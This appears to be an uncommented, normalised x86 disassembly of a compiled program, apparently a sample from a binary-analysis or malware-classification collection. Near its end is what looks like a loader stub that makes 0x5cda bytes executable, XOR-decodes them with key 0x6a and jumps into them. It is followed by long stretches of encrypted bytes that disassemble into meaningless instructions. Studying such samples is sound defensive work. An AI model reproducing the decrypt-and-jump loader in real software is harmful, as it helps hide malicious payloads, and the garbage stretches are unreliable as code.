call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov al [ eax + 0x5 ]
dec al
je r-xdata
dec dl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov al [ eax + 0x5 ]
dec al
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
dec al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
jmp r-xdata
sub_45e4e8
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x8 ]
call sub_40436c
call sub_408484
mov esi eax
push 0x0
push esi
mov eax [ ebx + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
test eax eax
jg r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
mov eax esi
call sub_4084b0
mov eax ebx
pop esi
pop ebx
retn
sub_45e524
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0xc ]
call sub_40436c
call sub_408484
mov esi eax
push 0x1
push esi
mov eax [ ebx + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
test eax eax
jg r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
mov eax esi
call sub_4084b0
mov eax ebx
pop esi
pop ebx
retn
sub_45e560
push ebx
push esi
push edi
mov edi eax
mov bl 0x1
mov eax [ edi + 0x10 ]
call sub_40436c
call sub_408484
mov esi eax
push 0x1
push esi
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
test eax eax
jg r-xdata
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
test eax eax
jg r-xdata
xor ebx ebx
jmp r-xdata
mov eax esi
call sub_4084b0
mov eax ebx
pop edi
pop esi
pop ebx
retn
xor ebx ebx
sub_45e5b4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c0
mov [ edi + 0xc ] esi
xor eax eax
mov [ edi + 0x10 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_45e5f8
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov eax [ esi + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
xor eax eax
mov [ esi + 0x14 ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_45e644
push edx
mov eax [ eax + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov edx eax
cmp edx 0x6
ja r-xdata
retn
jmp [ edx * 4 + jump_table_45e663 ]
xor eax eax
retn
mov eax 0x3
retn
mov eax 0x2
retn
mov eax 0x6
retn
mov eax 0x5
retn
mov eax 0x1
sub_45e6a0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
xor eax eax
push ebp
push j_sub_40382c#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ edi + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e830
lea eax [ ebp - 0x20 ]
mov edx 0x7
call sub_403ed0
retn
mov edx ebx
mov eax esi
call sub_45c4e8
test eax eax
jg r-xdata
mov [ ebx + 0x10 ] edi
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
test eax eax
jg r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
push r-xdata
mov eax ebx
call sub_45eb24
lea edx [ ebp - 0x14 ]
call sub_45ec84
push [ ebp - 0x14 ]
push r-xdata
push r-xdata
mov eax ebx
call sub_45eb24
lea edx [ ebp - 0x18 ]
call sub_45ec40
push [ ebp - 0x18 ]
push r-xdata
push r-xdata
mov eax ebx
call sub_45eb24
call sub_45ecb0
lea edx [ ebp - 0x1c ]
call sub_407c7c
push [ ebp - 0x1c ]
push r-xdata
push r-xdata
mov eax ebx
call sub_45eb24
lea edx [ ebp - 0x20 ]
call sub_45ecdc
push [ ebp - 0x20 ]
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0xc
call sub_40422c
mov esi [ ebx + 0xc ]
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov eax esi
mov edx [ r-xdata ]
call sub_4032a0
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
sub_45e898
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_45ea1e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov esi eax
mov [ ebx + 0x14 ] esi
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ea25
lea eax [ ebp - 0x20 ]
mov edx 0x7
call sub_403ed0
retn
mov edx ebx
mov eax esi
call sub_45c4e8
test eax eax
jg r-xdata
push edi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
test eax eax
jg r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
jmp r-xdata
push r-xdata
mov eax ebx
call sub_45eb24
lea edx [ ebp - 0x14 ]
call sub_45ec84
push [ ebp - 0x14 ]
push r-xdata
push r-xdata
mov eax ebx
call sub_45eb24
lea edx [ ebp - 0x18 ]
call sub_45ec40
push [ ebp - 0x18 ]
push r-xdata
push r-xdata
mov eax ebx
call sub_45eb24
call sub_45ecb0
lea edx [ ebp - 0x1c ]
call sub_407c7c
push [ ebp - 0x1c ]
push r-xdata
push r-xdata
mov eax ebx
call sub_45eb24
lea edx [ ebp - 0x20 ]
call sub_45ecdc
push [ ebp - 0x20 ]
push r-xdata
lea eax [ ebp - 0x8 ]
mov edx 0xc
call sub_40422c
mov esi [ ebx + 0xc ]
mov eax esi
mov edx [ r-xdata ]
call sub_40327c
test al al
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_4059ac
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b1c0
call sub_403864
mov eax esi
mov edx [ r-xdata ]
call sub_4032a0
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x60 ]
sub_45ea8c
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
push ebp
push edi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
mov esi eax
mov edx esi
mov eax ebx
call sub_45e644
cmp eax 0x2
je r-xdata
push ebp
push edi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
mov esi eax
cmp eax 0x3
jne r-xdata
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45ead8
push ebx
push esi
push edi
push ebp
mov ebp ecx
mov edi edx
mov ebx eax
push ebp
push edi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
mov esi eax
mov edx esi
mov eax ebx
call sub_45e644
cmp eax 0x2
je r-xdata
push ebp
push edi
mov eax [ ebx + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
mov esi eax
cmp eax 0x3
jne r-xdata
mov eax esi
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45eb24
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_45ebdc
mov [ ebx + 0x8 ] eax
sub_45eb4c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c0
mov [ edi + 0x4 ] esi
xor eax eax
mov [ edi + 0x8 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_45eb94
push ebx
push esi
push edi
call sub_403464
mov ebx edx
mov edi eax
mov esi [ edi + 0x8 ]
test esi esi
je r-xdata
mov esi [ edi + 0xc ]
test esi esi
je r-xdata
mov eax esi
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx ebx
and dl 0xfc
mov eax edi
call sub_4030e0
test bl bl
jle r-xdata
mov eax esi
mov dl 0x1
mov ecx [ eax ]
call [ ecx - 0x4 ]
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40344c
sub_45ebdc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_4030c0
mov [ edi + 0x4 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4033fc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403454
pop [ fs : 0x0 ]
add esp 0xc
sub_45ec18
push ebx
push esi
call sub_403464
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40344c
sub_45ec40
push ebx
push esi
add esp 0xfffffbfc
mov esi edx
mov ebx eax
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0xc
mov edx esi
call sub_408450
add esp 0x404
pop esi
pop ebx
retn
sub_45ec84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov edx esi
call sub_408450
pop esi
pop ebx
retn
sub_45ecb0
push ebx
push ecx
mov ebx eax
push esp
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add esp 0x8
mov eax [ esp ]
pop edx
pop ebx
retn
sub_45ecdc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop ecx
mov edx esi
call sub_408450
pop esi
pop ebx
retn
sub_45ed08
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_40382c#3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ed3b
retn
call sub_45d6e8
sub_45ed4c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh ch
add [ esp + ebp * 4 ] al
inc ebx
add [ esp + ebp - 0x5de7ffbd ] dh
inc ebx
add [ eax - 0x3a ] al
inc esp
add [ eax - 0x61 ] dl
inc ebx
add ah bh
sub eax [ ebx ]
add [ ebx + eax * 2 ] ch
add [ edi + eax * 8 ] dh
inc esp
add [ eax + 0x5c ] al
inc ebx
add [ eax + 0x37 ] al
inc ebx
add [ eax + 0x2d ] bh
inc ebx
add ah cl
cmp [ ebx ] al
sub cl cl
inc esp
add ah dh
mov [ eax + eax + 0x4 ] 0xa000433a
leave
inc esp
add ah al
pop esp
inc ebx
add [ edi + ebx * 4 - 0x5f9fffbd ] ah
inc ebx
add [ ebx + ebx * 4 + 0x43 ] bl
add [ eax + 0x43 ] al
add [ eax ] bh
mov ecx 0xd0440044
inc esp
add [ eax ] dl
jbe r-xdata
add [ eax - 0x5bffbfd0 ] cl
xor [ eax ] al
loopne r-xdata
inc esp
add [ eax - 0x3ffbaff ] cl
mov ebx 0xfc8c0044
inc esp
add [ ebx + 0x44 ] ch
add [ eax ] cl
fld [ eax + eax + 0x68 ]
loopne r-xdata
inc ebp
add [ eax + 0x45ee ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp * 8 ] cl
inc ebp
add [ ebx + eax ] dl
add [ eax ] al
pushfd
pop [ eax + eax + 0x7c ]
mov [ 0xffffffffbbc40041 ] al
inc esp
add [ eax - 0x43 ] bh
inc esp
add [ ebx + esi ] dh
inc eax
add ah ah
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
out dx eax
inc esp
add [ eax + 0x500043ac ] cl
retn
add [ eax + eax ] al
or eax [ ecx + 0x63 ]
je r-xdata
cld
add al [ eax ]
add [ ecx ] al
add [ ecx ] cl
inc edi
jb r-xdata
add [ eax - 0x2 ] al
add [ esp + edi * 8 - 0x1c93ffbc ] cl
inc esp
add [ edi + ebx * 8 ] ah
inc esp
add [ eax - 0x53ffbc8a ] ch
jbe r-xdata
xchg esp eax
in eax dx
inc ebp
add ah ah
nop
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x30c31
inc edx
add al al
jne r-xdata
inc esp
add [ ecx + ecx * 8 ] ah
inc esp
add [ edi ] al
add [ ebx ] dl
out dx eax
add [ eax + 0xc0044e1 ] ah
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
inc edx
nop
lea eax [ ebp - 0xc ]
push eax
push 0x40
push 0x5cda
mov eax [ ebp - 0x4 ]
push eax
push 0xffffffff
call ecx
call GetClipboardViewer
mov edx ebx
test edx edx
jb r-xdata
jb r-xdata
jne r-xdata
inc esp
add [ esi ] bl
xor [ ebp + ebp * 8 - 0x6f1bffbb ] edx
mov [ edx ] es
add [ ebp + 0x64a40042 ] ah
inc edx
add [ eax - 0xd ] bl
inc ebx
inc edx
outsd
js r-xdata
inc ebp
add al bh
add al [ eax ]
add [ eax ] al
add [ ecx ] cl
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
adc ebp edi
add [ ecx - 0x176bffbd ] al
inc esp
add [ eax - 0x4d ] bl
inc ebx
add [ eax ] al
sahf
inc ebx
add [ eax + 0x2c0044fd ] ch
mov bl 0x44
add ah bl
mov ch 0x44
add [ eax - 0x3bffbb12 ] cl
mov esi 0xbf400044
nop
nop
mov al [ ecx ]
nop
nop
jmp r-xdata
add [ edi ] al
push es
push esp
inc esi
outsd
jb r-xdata
dec edi
dec eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
nop
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0x8 ]
jmp r-xdata
add [ 0x64491500 ] al
push ebx
jb r-xdata
add eax [ eax ]
add [ ebx ] al
add [ eax ] al
add al [ eax ]
or dl [ ebx + 0x63 ]
jb r-xdata
nop
xor al 0x6a
mov [ ecx ] al
jmp r-xdata
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
nop
push ebx
dec esp
xor [ eax ] edx
add eax [ eax ]
add [ esi ] al
add [ ebx ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x6c616944
outsd
xor [ 0x4654 ] eax
outsd
jb r-xdata
add [ ecx * 8 + 0x53cc0045 ] cl
inc edx
add [ ebp - 0x10c7ffc0 ] cl
inc ebp
insb
insb
inc edx
popad
jb r-xdata
nop
inc [ ebp - 0xc ]
dec edx
mov [ ebp - 0xc ] 0x0
inc edx
xor [ edi ] eax
add [ eax - 0x66 ] ch
popad
outsb
insb
jb r-xdata
add al 0x3
add [ eax ] al
add eax [ eax ]
push es
push eax
popad
outsb
insb
xor [ eax ] ecx
add eax [ eax ]
sub_45ed9a
inc esp
add [ esi + edi + 0x41 ] bl
add [ eax - 0x23ffbb41 ] ah
mov edi 0xc0e80044
inc esp
add [ eax + 0x37 ] bl
inc ebx
add [ edx - 0x369fffbf ] dl
inc esp
add [ edi + ebx * 4 + 0x41 ] dh
add [ eax ] al
add eax 0xba380045
inc esp
add [ edi - 0x5347ffbd ] bl
inc ebx
add [ esp + ebp * 4 ] al
inc ebx
add [ esp + ebp - 0x5de7ffbd ] dh
inc ebx
add [ eax - 0x3a ] al
inc esp
add [ eax - 0x61 ] dl
inc ebx
add ah bh
sub eax [ ebx ]
add [ ebx + eax * 2 ] ch
add [ edi + eax * 8 ] dh
inc esp
add [ eax + 0x5c ] al
inc ebx
add [ eax + 0x37 ] al
inc ebx
add [ eax + 0x2d ] bh
inc ebx
add ah cl
cmp [ ebx ] al
sub cl cl
inc esp
add ah dh
mov [ eax + eax + 0x4 ] 0xa000433a
leave
inc esp
add ah al
pop esp
inc ebx
add [ edi + ebx * 4 - 0x5f9fffbd ] ah
inc ebx
add [ ebx + ebx * 4 + 0x43 ] bl
add [ eax + 0x43 ] al
add [ eax ] bh
mov ecx 0xd0440044
inc esp
add [ eax ] dl
jbe r-xdata
inc esp
add [ eax - 0x3ffbaff ] cl
mov ebx 0xfc8c0044
inc esp
add [ ebx + 0x44 ] ch
add [ eax ] cl
fld [ eax + eax + 0x68 ]
loopne r-xdata
add [ eax + eax ] al
or eax [ ecx + 0x63 ]
je r-xdata
cld
add al [ eax ]
add [ ecx ] al
add [ ecx ] cl
inc edi
jb r-xdata
add [ eax - 0x2 ] al
add [ esp + edi * 8 - 0x1c93ffbc ] cl
inc esp
add [ edi + ebx * 8 ] ah
inc esp
add [ eax - 0x53ffbc8a ] ch
jbe r-xdata
xchg esp eax
in eax dx
inc ebp
add ah ah
nop
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x30c31
inc edx
add al al
jne r-xdata
inc esp
add [ ecx + ecx * 8 ] ah
inc esp
add [ edi ] al
add [ ebx ] dl
out dx eax
add [ eax + 0xc0044e1 ] ah
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
inc edx
nop
lea eax [ ebp - 0xc ]
push eax
push 0x40
push 0x5cda
mov eax [ ebp - 0x4 ]
push eax
push 0xffffffff
call ecx
call GetClipboardViewer
mov edx ebx
test edx edx
jb r-xdata
jb r-xdata
jne r-xdata
inc esp
add [ esi ] bl
xor [ ebp + ebp * 8 - 0x6f1bffbb ] edx
mov [ edx ] es
add [ ebp + 0x64a40042 ] ah
inc edx
add [ eax - 0xd ] bl
inc ebx
inc edx
outsd
js r-xdata
inc ebp
add al bh
add al [ eax ]
add [ eax ] al
add [ ecx ] cl
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
adc ebp edi
add [ ecx - 0x176bffbd ] al
inc esp
add [ eax - 0x4d ] bl
inc ebx
add [ eax ] al
sahf
inc ebx
add [ eax + 0x2c0044fd ] ch
mov bl 0x44
add ah bl
mov ch 0x44
add [ eax - 0x3bffbb12 ] cl
mov esi 0xbf400044
nop
nop
mov al [ ecx ]
nop
nop
jmp r-xdata
add [ edi ] al
push es
push esp
inc esi
outsd
jb r-xdata
dec edi
dec eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
nop
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0x8 ]
jmp r-xdata
add [ 0x64491500 ] al
push ebx
jb r-xdata
add eax [ eax ]
add [ ebx ] al
add [ eax ] al
add al [ eax ]
or dl [ ebx + 0x63 ]
jb r-xdata
nop
xor al 0x6a
mov [ ecx ] al
jmp r-xdata
add eax 0x74696e55
xor [ eax ] eax
add [ ebx - 0x1374aa40 ] cl
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
nop
push ebx
dec esp
xor [ eax ] edx
add eax [ eax ]
add [ esi ] al
add [ ebx ] cl
inc esi
imul ebp [ esi + 0x64 ] 0x6c616944
outsd
xor [ 0x4654 ] eax
outsd
jb r-xdata
add [ ecx * 8 + 0x53cc0045 ] cl
inc edx
add [ ebp - 0x10c7ffc0 ] cl
inc ebp
insb
insb
inc edx
popad
jb r-xdata
nop
inc [ ebp - 0xc ]
dec edx
mov [ ebp - 0xc ] 0x0
inc edx
xor [ edi ] eax
add [ eax - 0x66 ] ch
popad
outsb
insb
jb r-xdata
add al 0x3
add [ eax ] al
add eax [ eax ]
push es
push eax
popad
outsb
insb
xor [ eax ] ecx
add eax [ eax ]
sub_45ef54
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
nop
nop
lea eax [ ebp - 0xc ]
push eax
push 0x40
push 0x5cda
mov eax [ ebp - 0x4 ]
push eax
push 0xffffffff
call ecx
call GetClipboardViewer
mov edx ebx
test edx edx
jb r-xdata
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0xc ] 0x0
nop
nop
mov al [ ecx ]
nop
nop
jmp r-xdata
nop
xor al 0x6a
mov [ ecx ] al
jmp r-xdata
nop
inc [ ebp - 0xc ]
dec edx
jne r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x8 ] eax
nop
mov ecx [ ebp - 0x4 ]
add ecx [ ebp - 0x8 ]
jmp r-xdata
sub_45efb4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
nop
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn 0x4
test ebx ebx
je r-xdata
push r-xdata
call sub_45efb4
cli
cli
cli
out 0x2f eax
0x8339393a 0x54c5
mov ecx r-xdata
mov edx 0x5cda
mov eax ebx
call sub_45ef54
add ebx 0x37c9
jae r-xdata
mov [ ebp - 0x4 ] ebx
nop
jmp [ ebp - 0x4 ]
call sub_403030
sub_45f2b8
out dx al
inc ecx
daa
push 0x6a
out 0xee eax
dec esi
cli
push 0x6a
push 0x3a
sub esp 0x79
push 0x6a
cli
cli
cli
cli
cli
cli
cli
cli
aas
loope r-xdata
loope r-xdata
jmp r-xdata
cli
cli
cli
cli
cli
cli
add [ edx - 0x19 ] ah
das
adc edi 0x32
push 0x6a
cli
cli
cli
cli
cli
xor ebp edi
stosb [ edi ]
sub [ ebx ] 0x29
push 0x6a
cmp edx ebx
pop edx
push 0x6a
push 0xe
loope r-xdata
test eax 0x833ffafa
xchg esp eax
jge r-xdata
loope r-xdata
cmp ah cl
das
bound ecx [ ebx ]
daa
mov [ edx + 0x6a6a3af8 ] al
xor ebp edi
stosb [ edi ]
out dx eax
add al 0x25
push 0x6a
xor [ ecx ] 0x72
push 0x6a
cli
cli
cli
cli
cli
cli
cli
out dx al
outsd
push 0x6a
push 0x59
mov [ 0xffffffffa962e30c ] eax
cli
cli
cli
cli
cli
push 0xfffffffa
mov [ 0xfffffffffafafaa9 ] eax
scasb [ edi ]
jecxz r-xdata
xor dx 0x63
push 0x6a
cli
xchg ebp eax
pop ds
xchg edx eax
and eax 0x23
push 0x6a
cli
cli
loope r-xdata
or al 0xe3
aaa
shl cl 0xb3
add [ ecx ] cl
or al 0xe3
aaa
cli
and [ edx + 0x62 ] 0x6a
push 0x2
jmp r-xdata
sub [ ecx + 0x7f ] 0x6a
push 0xfffffffa
or al 0xe9
push eax
push 0xffffff83
pop edi
push 0x6a
cli
cli
loope r-xdata
cli
cli
cli
cli
lodsd [ esi ]
das
and [ ecx ] 0x3c
daa
and [ ebp + 0x273c862f ] ebp
and [ esp + ecx ] edi
lodsd [ esi ]
das
0x2fad6a27 0x27b2
add ecx [ ecx ]
sbb [ ebx + 0x6a6a63fa ] al
cli
cli
cli
cli
jecxz r-xdata
xchg [ edx ] bh
push 0x6b836a6a
xchg ebp eax
xchg ebp eax
dec esi
jpe r-xdata
sahf
sub [ ebp - 0x59595bc ] 0xfffffffa
cli
cli
and [ ebx ] 0x7f
push 0x6a
cli
cli
cli
cli
cli
cli
cli
cli
xor eax 0x6a299b83
push 0x65
call 0x6ab0545f
cmp [ edx ] 0x75
push 0x6a
cli
cli
cmp [ ecx - 0x56 ] ebx
add [ ebp - 0x595958b ] 0xc
jmp 0xffffffff83b06da3
cmp ebp ecx
setbe [ edx - 0x7d ]
sbb [ ebx + 0x6a ] esp
push 0xfffffffa
cli
cli
xchg ebp eax
pop ecx
stosb [ edi ]
mov [ 0x3ffafaa9 ] eax
adc [ ebp + edi * 2 - 0x5c059596 ] 0xffffffa9
cli
cli
cli
sub [ ebx - 0x6b ] 0xffffff95
and [ ebx + 0x6f ] 0x6a
push 0xfffffffa
cli
cli
cli
cmp [ esi ] 0x3f
push 0x6a
cli
cli
cli
jmp 0x397f3df4
cli
cmp ah cl
lodsb [ esi ]
add [ eax + 0x4a ] 0x6a
push 0xffffffe9
stosb [ edi ]
out dx al
pop esp
daa
push 0x6a
jmp 0x6a9440ce
sub_45f581
push 0x6a
push 0xffffff82
insb
push 0x6a
add [ edx + 0x3f6a6a7b ] 0xffffff83
stosd [ edi ]
push eax
push 0x6a
cli
cli
cli
cli
or al 0xe3
das
test [ edx ] dh
add [ edi ] cl
xor [ ebx + 0x6a6a23a5 ] eax
cli
cli
cli
cli
cli
cli
cli
cli
[ gs : ebx + 0x298393e1 ]
sub_45f68b
out 0x1f eax
jpe r-xdata
cli
cli
cli
cli
xchg ebp eax
pop ds
mov es [ ebx + 0x6a6a76ed ]
cli
jecxz r-xdata
add dl [ edx + ebp * 2 + 0x6a ]
xor eax [ ebx + 0x6a6a385a ]
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
cli
out dx al
mov edx 0x82959596
lea ebx [ ecx + 0x6a ]
push 0xffffffef
stosb [ edi ]
push 0x35
test eax 0xfafafafa
cli
cli
cli
jmp 0xffffffffab357509
sub al [ edx + 0x6a6a6f1b ]
add cl [ edi ]
cdq
cmp eax 0x47b8839d
push 0x6a
cli
cli
cmp [ ebx + 0x6a6a53be ] eax
or al 0xe3
aaa
mov [ ecx - 0x4f ] ds
xor [ edx + 0x60 ] 0x6a
push 0xfffffffa
cli
cli
cli
xchg ebp eax
std
loope r-xdata
xor eax [ ebx + 0x6a6a6df8 ]
cli
cli
cli
cli
cli
cli
cli
add al [ edi + 0x39846c58 ]
or [ ecx - 0x70 ] 0xffffff95
xchg ebp eax
cli
cli
cli
cli
cli
cli
add [ ebx + eax * 4 + 0x1c ] al
push 0x6a
cli
cli
loope r-xdata
adc ebx 0xffffff96
